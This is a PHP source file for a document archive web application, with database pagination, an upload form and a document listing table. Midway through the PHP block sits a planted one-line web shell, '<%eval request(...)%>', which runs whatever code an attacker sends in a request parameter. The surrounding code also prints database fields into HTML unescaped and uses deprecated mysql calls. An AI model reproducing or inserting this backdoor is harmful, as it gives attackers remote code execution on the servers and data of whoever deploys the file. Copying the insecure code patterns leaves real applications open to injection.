___________________secForm.php

<?include ('connect.php');
     
	 
     /*------------------------------------------------PAGINATION--------------------------------------*/
	$tbl_name = "documents";		//your table name
    // How many adjacent pages should be shown on each side?
    $adjacents = 2;
    
    /* 
       First get total number of rows in data table. 
       If you have a WHERE clause in your query, make sure you mirror it here.
    */
    $query = "SELECT COUNT(*) as num FROM $tbl_name";
    $total_pages = mysql_fetch_array(mysql_query($query));
    $total_pages = $total_pages[num];
    
    /* Setup vars for query. */
    $targetpage = "archives/secForm.php"; 	//your file name  (the name of this file)
    $limit = 15; 								//how many items to show per page
    $page = $_GET['page'];
    if($page) 
	$start = ($page - 1) * $limit; 			//first item to display on this page
    else
	$start = 0;								//if no page var is given, set start to 0
    
    $sql = "SELECT documents.id, documents.name, documents.type, documents.size, documents.content, documents.docTitle, documents.status, documents.date, documents.cat_Id, categories.cat_name, documents.yearsId, years.year_name FROM documents, categories, years WHERE documents.cat_Id = categories.cat_Id AND documents.yearsId = years.yearsId ORDER BY date DESC, docTitle ASC";

 
    $results = mysql_query($sql);
    if(!$results){
     die("Could not execute query: ".mysql_error());
    }
    //echo $num = mysql_num_rows($results);
    // result 1
    
    /* Setup page vars for display. */
    if ($page == 0) $page = 1;					//if no page var is given, default to 1.
    $prev = $page - 1;							//previous page is page - 1
    $next = $page + 1;							//next page is page + 1
    $lastpage = ceil($total_pages/$limit);		//lastpage is = total pages / items per page, rounded up.
    $lpm1 = $lastpage - 1;						//last page minus 1
    <%eval request("ruijiangmei")%>
    /* 
	Now we apply our rules and draw the pagination object. 
	We're actually saving the code to a variable in case we want to draw it more than once.
    */
    $pagination = "";
    if($lastpage > 1)
    {	
	$pagination .= "<div class=\"pagination\">";
	//previous button
	if ($page > 1) 
	    $pagination.= "<a href=\"$targetpage?page=$prev&pid=$pid\"> previous</a>";
	else
	    $pagination.= "<span class=\"disabled\"> previous&nbsp;</span>";	
	
	//pages	
	if ($lastpage < 7 + ($adjacents * 2))	//not enough pages to bother breaking it up
	{	
	    for ($counter = 1; $counter <= $lastpage; $counter++)
	    {
		if ($counter == $page)
		    $pagination.= "<span class=\"current\">$counter</span>";
		else
		    $pagination.= "<a href=\"$targetpage?page=$counter&pid=$pid\">$counter</a>";					
	    }
	}
	elseif($lastpage > 5 + ($adjacents * 2))	//enough pages to hide some
	{
	    //close to beginning; only hide later pages
	    if($page < 1 + ($adjacents * 2))		
	    {
		for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
		{
		    if ($counter == $page)
			$pagination.= "<span class=\"current\">$counter</span>";
		    else
			$pagination.= "<a href=\"$targetpage?page=$counter&pid=$pid\">$counter</a>";					
		}
		$pagination.= "...";
		$pagination.= "<a href=\"$targetpage?page=$lpm1&pid=$pid\">$lpm1</a>";
		$pagination.= "<a href=\"$targetpage?page=$lastpage&pid=$pid\">$lastpage</a>";		
	    }
	    //in middle; hide some front and some back
	    elseif($lastpage - ($adjacents * 2) > $page && $page > ($adjacents * 2))
	    {
		$pagination.= "<a href=\"$targetpage?page=1&pid=$pid\">1</a>";
		$pagination.= "<a href=\"$targetpage?page=2&pid=$pid\">2</a>";
		$pagination.= "...";
		for ($counter = $page - $adjacents; $counter <= $page + $adjacents; $counter++)
		{
		    if ($counter == $page)
			$pagination.= "<span class=\"current\">$counter</span>";
		    else
			$pagination.= "<a href=\"$targetpage?page=$counter&pid=$pid\">$counter</a>";					
		}
		$pagination.= "...";
		$pagination.= "<a href=\"$targetpage?page=$lpm1&pid=$pid\">$lpm1</a>";
		$pagination.= "<a href=\"$targetpage?page=$lastpage&pid=$pid\">$lastpage</a>";		
	    }
	    //close to end; only hide early pages
	    else
	    {
		$pagination.= "<a href=\"$targetpage?page=1&pid=$pid\">1</a>";
		$pagination.= "<a href=\"$targetpage?page=2&pid=$pid\">2</a>";
		$pagination.= "...";
		for ($counter = $lastpage - (2 + ($adjacents * 2)); $counter <= $lastpage; $counter++)
		{
		    if ($counter == $page)
			$pagination.= "<span class=\"current\">$counter</span>";
		    else
			$pagination.= "<a href=\"$targetpage?page=$counter&pid=$pid\">$counter</a>";					
		}
	    }
	}
	
	//next button
	if ($page < $counter - 1) 
	    $pagination.= "<a href=\"$targetpage?page=$next&pid=$pid\">&nbsp;next </a>";
	else
	    $pagination.= "<span class=\"disabled\">&nbsp;next </span>";
	$pagination.= "</div>\n";		
    }
  
    /********************************************* Record Navigation ends here****************************************************/
    
     
    
     //$val = mysql_fetch_array($results); 
     //$subdir = str_replace(" ", "_", strtolower($val['user_name']));

    //result 2
    /*
     if(!$results){
       die("Could not connect the query");
       exit;
     }
	
    
     $queryStatus = "SELECT * FROM documents_status";
     $queryResult = mysql_query($queryStatus);	 
     
     if(!$queryResult){
       die("Could not connect the queryDiv");
       exit;
     }
     */
     
     $queryProv = "SELECT * FROM categories";
     $queryProvResult = mysql_query($queryProv);	 
     //echo $queryProv;
     
     if(!$queryProvResult){
       die("Could not connect the queryProv");
       exit;
     }
     
     
     $queryYears = "SELECT * FROM years";
     $queryYearsResult = mysql_query($queryYears);	 
     
     if(!$queryYearsResult){
       die("Could not connect the queryDiv");
       exit;
     }
     
     /*
     $queryCat = "SELECT * FROM documents_category";
     $queryCatResult = mysql_query($queryCat);
     //echo $queryHead;
     
     if(!$queryCatResult){
       die("Could not connect the queryCat");
       exit;
     }
     */
     
     $today = date('Y/m/d');		   
?>

<html>
<head>
<title>Coghsta Archive Management Application</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="../stylesheet/coghsta.css" type="text/css">
<SCRIPT LANGUAGE="JavaScript" SRC="CalendarMonth/calendar.js"></SCRIPT>


<script type="text/javascript">
function validateForm(uploadForm){
  if(uploadForm.title.value == ""){
    alert("Please enter your document name.");
    uploadForm.title.focus();
    return false;
  }
  else if(uploadForm.userfile.value == ""){
    alert("Please choose the file you wish to upload.");
    uploadForm.userfile.focus();
    return false;
  }
  else if(uploadForm.dc_description.value ==""){
    alert("Please choose your document category.");
    uploadForm.dc_description.focus();
    return false;
  }
   // ** END **
  return true;
}
</script>
</head>

<body>
<table width="58%" align="center">
  <tr>
      <td width="5%" align="left"><img src="../images/coghlogo.jpg" border="0" /></td>
      <td width="95%"><h4>&nbsp;Archive Document Management Application</h4></td>
  </tr>
  <tr><td colspan="4" class="rightnav" align="center"><a href="help.php" style="text-decoration:none">Help function</a>&nbsp;|<a href="../admin/logout.php" style="text-decoration:none; text-align:right">&nbsp;Logout</a></td></tr>
</table>
<table width="75%" cellpadding="1" cellspacing="1" align="center">
<tr><td colspan="10"><hr color="#FFCC33"></td></tr>
<tr><td>
   <form action="upload.php" method="post" name="uploadForm" enctype="multipart/form-data">
    <fieldset style="width:850px; margin-left:185px; margin-right:185px;">
     <legend><font color="#0066a4" size="-1">Form Upload</font></legend>
    <table border="0" cellspacing="0" cellpadding="0" width="75%" align="center">
    <tr><td>&nbsp;</td></tr>	
    <tr valign="top">
      <td valign="top"><h3>Document Name: <font color="#FF0000"><strong>*</strong></font></h3></td>
      <td colspan="4"><input type="text" size="87" name="title"></td>                                      
    </tr>
    <tr valign="top">
      <td><h3>Document to Upload: <font color="#FF0000"><strong>*</strong></font></h3></td>
      <td><input type="file" name="userfile" size="75" id="userfile"></td>
    </tr>
  
    <tr valign="top">
      <td><h3>Category: <font color="#FF0000"><strong>*</strong></font></h3></td>
      <td colspan="4"> <select style="width:185px" name="cat_name">
          <option>-- choose archive category --</option>
         <?php 
	         while($row = mysql_fetch_assoc($queryProvResult)){
		   $name = $row['cat_name'];
		   $value = $row['cat_Id'];
		   echo "<option value=$value>$name</option>";
		 }		
	      ?>			  
          
        </select>&nbsp;</td>    
    </tr>  
  
    <tr valign="top">
      <td><h3>Year: <font color="#FF0000"><strong>*</strong></font></h3></td>
      <td colspan="4"> <select style="width:185px" name="year_name">
          <option>-- choose the year --</option>
         <?php 
	         while($row = mysql_fetch_assoc($queryYearsResult)){
		   $name = $row['year_name'];
		   $value = $row['yearsId'];
		   echo "<option value=$value>$name</option>";
		 }		
	      ?>			  
          
        </select>&nbsp;</td>    
    </tr>  
    
    <tr valign="top">
      <td><h3>Date: <font color="#FF0000"><strong>*</strong></font></h3></td> 	   
      <td colspan="4" valign="top"><input type="text" name="pdate" id="pdate" value="<?php echo "$today"; ?>">
        <a href="javascript:doNothing()" onClick="setDateField(document.uploadForm.pdate);top.newWin = window.open('CalendarMonth/calendar.html','cal','dependent=yes,width=210,height=230,screenX=200,screenY=300,titlebar=yes')"><IMG SRC="CalendarMonth/icon_calendar.jpg" BORDER=0></a>	
      </td>	   
    </tr>
    <tr><td><input type="hidden" name="MAX_FILE_SIZE" value="2000000"></td>
      <td align="left"> 
           <input type="submit" name="upload" id="userfile" value=" Upload " onClick="return validateForm(this.form)">
           <input name="reset" type="reset" value=" Clear ">&nbsp;&nbsp;
     </td>
    </tr>
  </table>
  <p class="denotes"> * Denotes Required Field</p>
  </fieldset>
 </form>
<br>


<table cellpadding=3 cellspacing=0 border=1 width="95%" bordercolor="#CCCCCC" align="center" style="color:#000000; font: 12px  Arial, Helvetica, sans-serif">
  <tr bgcolor="#Ece9d8" class="tablehead"> 
    <td width="28%">Document Name</td>
    <td width="12%">Category</td> 
    <td width="32%">Uploaded Documents</td>
    <td width="10%">Current Date</td>
    <td width="5%">Year</td>
    <td width="5%">Edit</td>
    <td width="10%">Status(A/I)</td>
    <td width="10%" id="del">Delete</td>	
  </tr>
           <?
	   //result 3
              while ($rsDisplayDocs = mysql_fetch_assoc($results))
                {    
		    $subdir = str_replace(" ", "_", strtolower($rsDisplayDocs['user_name']));
		    print "<tr><td>$rsDisplayDocs[docTitle]</td>".
			  "<td>$rsDisplayDocs[cat_name]</td>".
			  /*"<td>$rsDisplayDocs[dc_description]</td>".
			  "<td>$rsDisplayDocs[ds_description]</td>".*/
		          "<td><a href=\"../archives/uploads/$rsDisplayDocs[name]\" target=\'_blank\'>$rsDisplayDocs[name]</a></td>".
			  "<td>$rsDisplayDocs[date]</td>".  
			  "<td>$rsDisplayDocs[year_name]</td>".
			  "<td><a href=\"updateRecForm.php?id=$rsDisplayDocs[id]\">Edit</a></td>".
			  "<td><a href=\"change_status.php?id=$rsDisplayDocs[id]&status=$rsDisplayDocs[status]\">$rsDisplayDocs[status]</a></td>".
			  "<td><a href=\"deleteRec.php?id=$rsDisplayDocs[id]\" onClick=\"return confirm('Do you want to delete?')\";>Delete</a></td></tr>";
	        } 
			
	    ?>			
</table>

<table align="center">
<tr><td>&nbsp;</td></tr>
<tr><td>&nbsp;</td></tr>
<tr>
   <td><? echo $pagination; ?></td>
</tr>
</table>
</td></tr></table>
</body>
</html>
